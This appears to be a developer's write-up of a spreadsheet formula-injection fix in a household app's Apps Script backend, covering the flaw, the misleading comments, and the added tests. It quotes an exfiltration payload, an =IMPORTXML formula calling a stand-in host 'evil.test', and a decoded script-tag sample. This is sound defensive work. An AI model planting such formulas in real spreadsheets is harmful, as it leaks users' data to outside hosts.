# The second line that was the only one

*A list field reached the household's Google Sheet as a live formula. The
server function that should have stopped it covered scalars and skipped
arrays — and its comment excused the narrowness by pointing at a client-side
first line of defence that has never been called.*

## The threat, in the repository's own words

`apps-script/Sheets.gs`:

> *"A value beginning `=`, `+`, `-` or `@` is a formula to Sheets. A payee
> named `=IMPORTXML("http://evil.test", "//x")` would exfiltrate the row the
> moment anyone opened the workbook."*

That is correct, and it is the whole reason `defuse()` exists.

## What `defuse` covered

```js
if (value === undefined || value === null) {
  row.push('');
} else if (value instanceof Array) {
  row.push(value.join(', '));      // ← not defused
} else if (typeof value === 'object') {
  row.push(JSON.stringify(value));
} else {
  row.push(defuse(value));
}
```

Sheets reads the **cell**. What matters is the first character of the string
that lands in it, not whether the value began life as a list. Measured through
the deployed `.gs`, character-for-character:

```
scalar payee cell : "'=IMPORTXML(\"http://evil.test\",\"//x\")"
array  tags  cell : "=IMPORTXML(\"http://evil.test\",\"//x\"), groceries"

is the array cell a live formula? YES — it reaches Sheets as a formula
```

The scalar beside it was escaped. Array fields are `tags`, `files`,
`multiref` and `multienum` — and `tags` is free text, while `files` carries
names that came from outside the household.

The object branch is genuinely safe: `JSON.stringify` always yields `{`, `[`,
a quote or a digit, none of which Sheets treats as a formula. That was left
undefused correctly, and now says so rather than looking like the same
omission.

## The comment that explained it away

```
 * The client already prefixes an apostrophe; this is the second line of the
 * same defence, for rows written by an older client.
```

```
$ grep -rn 'escapeForSheet' js/
js/security/sanitize.js    the definition
```

**No caller.** No client has ever prefixed anything. `defuse` is not the
second line of a defence; it is the only one — which is exactly why its
narrowness mattered, and exactly what the comment made it easy not to notice.

## Three sanitisers, and which of them run

| | wired | where |
| --- | --- | --- |
| `safeUrl` | yes | `js/modules/crud.js` |
| `escapeCsv` | yes | `js/reports/csv.js` |
| `safeFileName` | yes | `js/sync/drive.js`, `js/reports/build.js` |
| `escapeForSheet` / `unescapeFromSheet` | **no** | — |
| `sanitizeHtml` / `stripTags` | **no** | — |

`js/security/sanitize.js` opened by naming three things "this file covers",
two of which it did not. Rich text was the other: the header said notes
"store HTML by design" and are "parsed and rebuilt from an allow-list". They
are not — `richtext` is edited in a plain `<textarea>` and drawn as a text
node, and `tools/lint.mjs` refuses any assignment to `innerHTML` in what
ships, with `tests/modules.test.mjs` proving that rule fires.

So there is **no HTML-rendering vulnerability**, and the real defence is
stronger than the one described. But a security file describing a defence
that does not run is worse than one admitting a gap: the next person to make
notes render as markup would reasonably believe the sanitiser was already in
the path.

## What changed

One line of behaviour:

```js
row.push(defuse(value.join(', ')));
```

Everything else is comments telling the truth. `escapeForSheet` and
`sanitizeHtml` are **kept and labelled unwired** rather than deleted, and
rather than wired — prefixing on the client would change what goes over the
wire and what `restore()` has to strip, which is a change to stored data, not
to a defence.

## A claim in this document that did not survive checking

An earlier draft of the paragraph above said those functions are "correct code
for a day that may come". That was asserted, not verified, in a document whose
whole subject is asserting defences that do not run — so it was checked, and
half of it was wrong.

`sanitizeHtml` fell through to `stripTags` when there is no DOM. `stripTags`
strips tags and **then decodes entities**:

```js
.replace(/<[^>]*>/g, '')
.replace(/&lt;/g, '<')
.replace(/&gt;/g, '>')
```

so encoded markup comes back out live:

```
stripTags('&lt;script&gt;alert(1)&lt;/script&gt;')  →  "<script>alert(1)</script>"
```

That is correct for what `stripTags` is *for* — readable text in a PDF or a
spreadsheet cell, where decoding is what you want — and wrong for a function
named `sanitizeHtml`, which returned it in the one context where nothing had
parsed anything. The no-DOM branch now escapes instead, because every return
of that function has to be safe to treat as HTML or the name is a lie, and
`stripTags` is documented as extraction so nothing reaches for it as a defence
again.

Neither had a single test. They have three now, including one pinning
`stripTags`' decoding as a decision rather than a surprise.

## Round-trip

Never silently lose data. Through the deployed `.gs`, in and out:

```
in  : {"payee":"-500 adjustment","tags":["@mention"]}
cell: ["'-500 adjustment","'@mention"]
out : {"payee":"-500 adjustment","tags":"@mention"}
```

Ordinary values are untouched: `Reliance Fresh` stays `Reliance Fresh`, and
`['food','delivery']` stays `food, delivery`.

## Tests

Six, in `tests/backend.test.mjs`, all through the real `Sheets.gs`:

1. A scalar cell is defused.
2. And so is a list — the fault.
3. Every leading character Sheets treats as a formula: `=`, `+`, `-`, `@`.
4. An ordinary value is not touched.
5. The escape comes back off on the way in.
6. A stringified object needs no escaping and gets none.

`tests/security.test.mjs` already tested `escapeForSheet` thoroughly. Those
tests are kept and now carry a note saying what they do not prove — the
repository's own sentence, earned once already over `safeUrl`: *a test of a
function nothing calls proves the function works and says nothing about the
application.*

## Mutations

| Mutation | Caught by |
| --- | --- |
| Restore the undefused array branch | 2 and 3 |
| Defuse everything, escaping ordinary names | 4 |
| Drop `-` and `@` from the pattern | 3 |
| `restore()` stops stripping the apostrophe | 5 |

## Note for the deployment

This is a change to `apps-script/Sheets.gs`, so it takes effect only once the
Apps Script is redeployed. Rows already written with a formula in a list cell
stay as they are; the workbook is the household's own file and nothing here
rewrites it.
